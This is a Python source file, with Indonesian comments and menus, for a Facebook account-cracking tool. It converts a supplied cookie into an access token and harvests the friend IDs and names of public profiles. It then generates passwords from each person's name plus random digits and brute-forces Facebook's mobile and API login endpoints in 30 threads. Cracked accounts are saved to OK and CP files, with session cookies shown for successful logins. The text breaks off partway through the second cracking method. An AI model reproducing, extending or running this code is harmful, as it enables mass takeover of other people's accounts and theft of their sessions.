Meledak=[]
Cik=[]
# ---------------- [ INSTALASI IMPORT ] -:--------------- #

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
import inquirer,subprocess

# ---------------- [ INSTALASI FROM IMPORT ] ------------------ #

from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn, SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol,Console
from bs4 import BeautifulSoup as sop, BeautifulSoup
from rich.table import Table as me
from rich.columns import Columns as col, Columns
from inquirer.themes import Default
from pyfiglet import Figlet

# --------------- [ INSTALASI RICH PANEL ] ----------------- #

from time import time as CikKawan
from rich.panel import Panel as nel, Panel
from rich import print as prints
from rich.tree import Tree
from rich import pretty

###----------[ WARNA PRINT RICH ]---------- ###

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
console = sol()
# ------------- [ MENENTUKAN TANGGAL ] -------------- #

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
tgl = datetime.datetime.now().day
skrng = datetime.datetime.now()
tahun, bulan, hari = skrng.year, skrng.month, skrng.day
tanggal = ("%s-%s-%s"%(hari,bulan_cek[bulan-1],tahun))
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# ---------------- [ METHODE PENGUNCI ] ------------------ #

loop=0
ok=0
cp=0
akun=[]
oprek=[]
method=[]
tokenku=[]
uid=[]
pwnya=[]
pwpluss=[]
cokbrut=[]
id = []
id2 = []
pretty.install()
CON=sol()
console=sol()
ugen=[]
ugent=[]
dump=[]
cokbrut=[]
xyz = requests.Session()
ses=requests.Session()
princp=[]
Merasa_udh_jagoan=[]
rr = random.randint
rc = random.choice

# ---------------- [ PEMBERSIH LAYAR ] ------------------ #

def clear():
    if 'linux' in sys.platform.lower():os.system('clear')
    elif 'win' in sys.platform.lower():os.system('cls')


# ------------ [  USER AGENT ] -------------- #


for _ in range(3000):
    a = random.randrange(3, 12)
    b = random.choice([
        'A37f', 'A37fw', 'G8231', 'SO-41B', 'XQ-CC54', 'XQ-CQ54', 'XQ-AU52',
        'XQ-BE52', 'XQ-BE72', 'XQ-CQ72', 'SO-54C', 'E6833', 'A202SO', 'SGP771',
        'I4193', 'XQ-CC72', 'SOV34', 'XQ-CQ54', 'H4433', 'I4332', 'I4312', 'M880',
        'SGP551', 'SGP521', 'SGP611', 'SGP312', 'SOV35', 'SOV31', 'SOV35', 'SGP412',
        'XQ-BE62', 'Redmi 10 5G', 'Redmi S2', 'Redmi Note 9S', 'Redmi X', 'Redmi Y1',
        'Redmi Y1 Lite', 'Redmi Y2', 'Redmi Y3', 'Redmi Note 7 Pro', 'Redmi Note 7S',
        'Redmi Note 8', 'Redmi Note 10 JE', 'Redmi Note 11 4G', 'Redmi Note 11T Pro',
        'Redmi Note 11T Pro+', 'Redmi Note 11S 5G', 'Redmi Note 11 5G', 'Redmi 10',
        'Redmi 1', 'Redmi Note 11', 'Redmi 10S', 'Redmi 10I', 'Redmi 10C', 'Redmi 10A',
        'Redmi Note 1', 'Redmi Note 10', 'Redmi K50', 'Redmi 3X', 'Redmi 1S', 'Redmi 12C',
        'Redmi 2A', 'Redmi 12', 'Redmi 6A', 'Redmi 5 Pro', 'Redmi 5 Plus', 'Redmi 5pro',
        'Redmi 5A', 'Redmi 85781', 'Redmi 7i', 'Redmi 7 Pro', 'Redmi 7', 'Redmi 7A',
        'Redmi 9A', 'Redmi 9T NFC', 'Redmi 9T', 'Redmi 9pro', 'Redmi 9C', 'Redmi Go',
        'Redmi A8', 'Redmi A90', 'Redmi A2', 'MI MAX 2', 'Redmi A3', 'X677', 'X6821',
        'X6711', 'X559', 'X665C', 'X6819', 'X665B', 'X672', 'X6739', 'X6731B', 'X6811B',
        'X676B', 'X687', 'X609', 'X697', 'X680D', 'X507', 'X605', 'X668', 'X6815B', 'X624',
        'X655F', 'X689C', 'X608', 'X698', 'X682B', 'X682C', 'X688C', 'X688B', 'X658E',
        'X659B', 'X689'
    ])
    c = random.choice([
        'zh-TW', 'es-es', 'pt-br', 'zh-cn', 'zh-CN', 'it-it', 'it-it', 'en-us', 'zh-tw',
        'en-US', 'fa-ir', 'id-id'
    ])
    d = random.randrange(1111, 2999)
    e = random.randrange(11, 25)
    f = random.randrange(73, 120)
    g = random.randrange(1200, 6900)
    h = random.randrange(40, 150)
    uaku2 = f'Mozilla/5.0 (Linux; Android {a}; {b} Build/{d}.0.0{e}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36'
    ugent.append(uaku2)


# ----------- [ DEF LOGO ] -------------- #


def logo():
    prints(Panel.fit('  _________   _____ __________.____   __________ \n /   _____/  /     \\______   \    |  \______   \ \n \_____  \  /  \ /  \|     ___/    |   |    |  _/ \n /        \/    Y    \    |   |    |___|    |   \ \n/_______  /\____|__  /____|   |_______ \______  / \n        \/         \/                 \/      \/ ',style="bold green"))
    prints(f"[bold green]Teori \t : Brudallll \tScript \t : BrudalllllXX[bold white]")


# ------------ [ DEF LOGIN ] ------------- #


def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cookie.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            Login_lagi()
        except requests.exceptions.ConnectionError:
            prints(' Internet Anda Hilang')
            exit()
    except IOError:
        Login_lagi()


# --------- [ DEF LOGIN COOKIE ] ----------- #


def Login_lagi():
    clear()
    prints('')
    sesaat = requests.Session()
    your_cookies = input("masukan Cookie :  ")
    try:
        sesaat.headers.update({'content-type': 'application/x-www-form-urlencoded',})
        data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
        response = json.loads(sesaat.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
        code, user_code = response['code'], response['user_code']
        verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
        sesaat.headers.pop('content-type')
        sesaat.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
        response2 = sesaat.get(verification_url, cookies = {'cookie': your_cookies}).text
        if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
            Sup = Tree(f"")
            Sup.add(Panel.fit(f" {your_cookies}",style="bold green"))
            prints(Sup)
            prints("Cookie Invalid...", end='\r')
            prints("")
            exit()
        else:
            action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
            fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
            jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
            data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
            sesaat.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
            response3 = sesaat.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
            if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                sesaat.headers.pop('content-type');sesaat.headers.pop('origin')
                response4 = sesaat.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
                action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
                fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
                scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
                display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
                user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
                logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
                auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
                encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
                return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
                sesaat.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
                jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
                data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
                response5 = sesaat.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
                windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
                sesaat.headers.pop('content-type');sesaat.headers.pop('origin')
                sesaat.headers.update({'referer': 'https://m.facebook.com/',})
                response6 = sesaat.get(windows_referer, cookies = {'cookie': your_cookies}).text
                if 'Sukses!' in str(response6):
                    sesaat.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
                    response7 = sesaat.get(status_url, cookies = {'cookie': your_cookies}).text
                    access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
                    cokiew = open(".cookie.txt", "w").write(your_cookies)
                    tok = open(".token.txt", "w").write(access_token)
                    Sup = Tree(f"")
                    Sup.add(Panel.fit(f" {access_token}",style="bold green"))
                    prints(Sup)
                    time.sleep(2)
                    login()
    except Exception as e:
        prints(nel(f'{H2}Cookie anda expired/kedaluwarsa makanya ganteng{P2}',width=80,padding=(0,7),style=f"bold blue"));time.sleep(2)
        os.system("rm -f .cookie.txt")
        os.system("rm -f .token.txt")
        prints(e)
        exit()


# --------- [ DEF MENU ] ----------- #


def menu(my_name, my_id):
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cookie.txt', 'r').read()
    except IOError:
        print('\033[0mExpired Cookies ')
        time.sleep(5)
        Login_lagi()
    clear()
    prints(Panel(f"[bold green]\t\tMenu Pilihan [bold white]",style="blue",width=50))
    prints(f"[[bold blue] + [bold white]] [bold green]1. Crack Dari Publik ")
    prints(f"[[bold blue] + [bold white]] [bold green]2. Cek Hasil Result ")
    prints(f"[[bold blue] + [bold white]] [bold green]3. Dump Grup / Profile limit ")
    prints(f"[[bold blue] + [bold white]] [bold green]4. Crack Dari File ")
    prints(f"[[bold blue] + [bold white]] [bold green]5. Create Page ")
    prints(f"[[bold blue] + [bold white]] [bold green]0. Keluar ")
    Cikkawan = input(f"[ + ] masukan pilihan menu : ")
    if '1' in Cikkawan: dump_publik()
    elif '2' in Cikkawan: result()
    elif '3' in Cikkawan: os.system('python grup.py')
    elif '4' in Cikkawan: crack_file()
    elif '5' in Cikkawan:
        prints(Panel(f"[bold green]\t\tCreate Page [bold white]",style="blue",width=50))
        name     = input(f"[ + ] masukan nama page cth = Alya Sayang ku : ")
        category = input(f"[ + ] masukan category page cth = 2214 : ")
        toket    = input(f"[ + ] masukan token : ")
        CreatePage(name=name, category=[category], token=toket)
    elif '0' in Cikkawan:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('[ + ] Berhasil Menghapus Cookies Dan Token ')
        exit()
    else:
        print(Panel.fit(f" Pilihan anda tidak ada di menu / salah ketik "))


# --------- [ DEF CRACK DARI FILE ] ----------- #


def crack_file():
    file = input(f'Masukan Nama File Yang Di Sdcard Anda : ')
    try:
        uuid = open(file,'r').readlines()
        for data in uuid:
            try:user,nama = data.split('|')
            except:exit(f" [{M}>{P}] pemisah salah")
            id.append(data)
            print('\r sedang dump %s id'%(len(id)),end=" ")
            time.sleep(0.0000003)
    except FileNotFoundError:exit(f"File Tidak Terbaca")
    print(f'\rtotal jumlah akun dump adalah {len(id)}')
    setting()


# --------- [ DEF CRACK PERTEMANAN PUBLIK ] ----------- #


def dump_publik():
    try:
        token = open('.token.txt','r').read()
        kukis = open('.cookie.txt','r').read()
    except IOError:
        exit()
    prints(f'Ketik Me Jika Ingin Crack Teman Sendiri ')
    pil = input(x+m+''+x+'Username/Id : ')
    try:
        params = {"access_token": token,"fields": "name,friends.fields(id,name,birthday)"}
        koH = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],params=params,cookies={'cookie': kukis}).json()
        for pi in koH['friends']['data']:
            try:id.append(pi['id']+'|'+pi['name'])
            except:continue
        print('Total Id Collected'+str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print('╰─ Internetmu Gak Ada Bodoh')
        exit()
    except (KeyError,IOError):
        print('╰─ Pertemanan Tidak Publick Cookie And Token Anda Busuk')
        exit()


# ---------- [ CEK RESULT HASIL KREK ] --------------- #


def result():
    print('╰─ 1. Hasil CP Anda ')
    print('╰─ 2. Hasil OK Anda ')
    print('╰─ 0. Kembali')
    kz = input('\n╰─ Choose : ')
    print('')
    if kz in ['1', '01']:
        folder = 'CP'
        message_empty = 'Anda Tidak Memiliki Hasil CP'
        color = '\033[31m'
        file_not_found = 'File Tidak Ditemukan'
    elif kz in ['2', '02']:
        folder = 'OK'
        message_empty = 'Anda Tidak Mempunyai File OK'
        color = '\033[32m'
        file_not_found = 'File Tidak Ditemukan'
    elif kz in ['0', '00']:
        back()
    else:
        print('╰─ Pilih Yang Benar!')
        exit()
    try:
        vin = os.listdir(folder)
    except FileNotFoundError:
        print(f'╰─ {file_not_found}')
        time.sleep(2)
        back()
    if len(vin) == 0:
        print(f'╰─ {message_empty}')
        time.sleep(2)
        back()
    else:
        cih = 0
        lol = {}
        for isi in vin:
            try:
                hem = open(f'{folder}/{isi}', 'r').readlines()
            except:
                continue
            cih += 1
            if cih < 10:
                nom = str(cih)
                lol.update({str(cih): str(isi)})
                lol.update({nom: str(isi)})
            else:
                lol.update({str(cih): str(isi)})
            print(f'{nom}. {isi}{color} {str(len(hem))} \033[0mcheckpoint')
        geeh = input('\n╰─ Choose : ')
        print('')
        try:
            geh = lol[geeh]
        except KeyError:
            print('╰─ Pilih Yang Benar!')
            exit()
        try:
            lin = open(f'{folder}/{geh}', 'r').read().splitlines()
        except:
            print(f'╰─ {file_not_found}')
            time.sleep(2)
            back()
        nocp = 0
        for cpku in range(len(lin)):
            cpkuni = lin[nocp].split('|')
            if kz in ['1', '01']:
                print(f'╰─ CP\033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
            elif kz in ['2', '02']:
                print(f'\n╰─ OK\033[32m {cpkuni[0]}|{cpkuni[1]}|\033[32m{cpkuni[2]}\033[0m')
            nocp += 1
        input('\n╰─ Back Enter ')
        back()
def back():
    pass


# ---------- [ UMUR AKUN YANG AKAN DI PILIH ] --------------- #



def setting():
    prints(Panel(f"[bold green]\t\tMenu Pilihan [bold white]",style="blue",width=50))
    prints(f"[[bold blue] + [bold white]] [bold green]1. Crack Account Old ")
    prints(f"[[bold blue] + [bold white]] [bold green]2. Crack Account New ")
    prints(f"[[bold blue] + [bold white]] [bold green]3. Crack Account Random ")
    Cikkawan = input(f"[ + ] masukan pilihan menu : ")
    if '1' in Cikkawan:
        for tua in sorted(id):
            id2.append(tua)
    elif '2' in Cikkawan:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif '3' in Cikkawan:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:print('╰─ input correctly ');exit()
    prints(Panel(f"[bold green]\t\tMenu Pilihan [bold white]",style="blue",width=50))
    prints(f"[[bold blue] + [bold white]] [bold green]1. Metode Account Async Brudal")
    prints(f"[[bold blue] +[bold white] ] [bold green]3. Metode Account Reguler Api")
    Cikkawan = input(f"[ + ] masukan pilihan menu : ")
    if '1' in Cikkawan:
        method.append('mobile')
    elif '3' in Cikkawan:
        method.append('api')
    else:method.append('mobile')
    sandi()


# ---------- [ SANDI ] --------------- #


def sandi():
    prints(Panel(f"[bold green]\t\tMenu Pilihan [bold white]",style="blue",width=50))
    prints(f"[bold white][ [bold blue]01[bold white] ][bold yellow] Generation Pass Req Script [bold white]")
    prints(f"[bold white][ [bold blue]02[bold white] ][bold yellow] Generation Pass Req Manualy [bold white]")
    pwplus = input("[ + ] Masukan pilihan : ")
    if pwplus in ["2"]:
        pwpluss.append('ya')
        prints(Panel.fit(f"[bold white]Minimal 6 huruf dan jika ingin banyak password gunakan lah koma [ , ] atau [ <> ]", style="bold green"))
        pwku = input("+_ masukan password anda : ")
        pwkuh = pwku.split("," or "<>")
        for xpw in pwkuh:
            pwnya.append(xpw)
        babi()
    elif pwplus in ["1"]:
        babi()
    else:
        babi()


# ---------- [ PASS LIST ] --------------- #


def babi():
    global prog,des,loop
    print("")
    loop+=len(id)
    Cik.append(Panel(f"[bold white]OK : %s[bold white]"%(okc),style="bold green"))
    Cik.append(Panel(f"[bold white]CP : %s[bold white]"%(cpc),style="bold green"))
    console.print(Columns(Cik))
    prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('',total=len(id))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf = yuzong.split('|')[0]
                nmf = yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                angka1 = str(random.randint(100,999))
                angka2 = str(random.randint(1000,9999))
                angka3 = str(random.randint(10000,99999))
                angka4 = str(random.randint(100000,999999))
                pwv = []
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+angka1)
                        pwv.append(frs+angka2)
                        pwv.append(frs+angka3)
                        pwv.append(frs+angka4)
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+angka1)
                        pwv.append(frs+angka2)
                        pwv.append(frs+angka3)
                        pwv.append(frs+angka4)
                if 'ya' in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if 'mobile' in method:
                    pool.submit(crack,idf,pwv)
                elif 'api' in method:
                    pool.submit(crackapi,idf,pwv)
                else:
                    pool.submit(crack,idf,pwv)
        print('')
        sys.stdout.write('Berhasil Mengcrack %s Ok:%s Cp:%s Akuntod'%((len(id)),ok,cp))
        print('')


# ---------- [ CRACK METODE 1 ] --------------- #


def crack(idf,pwv):
    global loop,ok,cp
    bi = random.choice(['\33[m'])
    pers = loop*100/len(id2)
    fff = '%'
    prog.update(des,description=f'{(loop)} ok : {(ok)} cp : {(cp)}')
    prog.advance(des)
    ses = requests.Session()
    ua = "Mozilla/5.0 (Linux; Android 11; RMX3261 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/456.0.0.39.90;]"
    for pw in pwv:
        try:
            ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                Meledak = Tree(Panel.fit(f"Login checkpoint",style="yellow"))
                Meledak.add(Panel.fit(f"{idf} | {pw}",style="yellow"))
                Meledak.add(Panel.fit(f"{ua}",style="yellow"))
                prints(Meledak)
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                session = requests.Session()
                kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                Meledak = Tree(Panel.fit(f"Login Successfully",style="green"))
                Meledak.add(Panel.fit(f"{idf} | {pw}",style="green"))
                Meledak.add(Panel.fit(f"{kukis}",style="green")).add(Panel.fit(f"{ua}",style="green"))
                prints(Meledak)
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(3)
    loop-=1


# ---------- [ CRACK METODE 2 ] --------------- #


def crackapi(idf,pwv):
    global loop,ok,cp
    bi = random.choice(['\33[m'])
    pers = loop*100/len(id2)
    fff = '%'
    ses = requests.Session()
    prog.update(des,description=f'{(loop)} ok : {(ok)} cp : {(cp)}')
    prog.advance(des)
    ua = random.choice(ugent)
    AinkRaka = random.choice(["id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
    ses = requests.Session()
    for pw in pwv:
        try:
            p = ses.get("https://p.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fp.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D3213804762189845%26cbt%3D1713932735608%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df468c892445c2baf9%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff55d76d7b702b1bb1%2526relation%253Dopener%26client_id%3D3213804762189845%26display%3Dpopup%26domain%3Dwww.capcut.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fid-id%252Flogin%26locale%3Den_US%26logger_id%3Dfdfa4369659211140%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcd7790f9c8244212%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff55d76d7b702b1bb1%2526relation%253Dopener%2526frame%253Df1c4162b6fdf4739c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv19.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfcd7790f9c8244212%26domain%3Dwww.capcut.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.capcut.com%252Ff55d76d7b702b1bb1%26relation%3Dopener%26frame%3Df1c4162b6fdf4739c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0")
            Rajia_Maut_Menunggu_Kehadiran_Sang_Pembuat_Dosa_Mengalir ={
            "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            "email": idf,
            "pass":pw,
            "m_ts": re.search('name="m_ts" value="(.*?)"', str(p.text)).group(1),
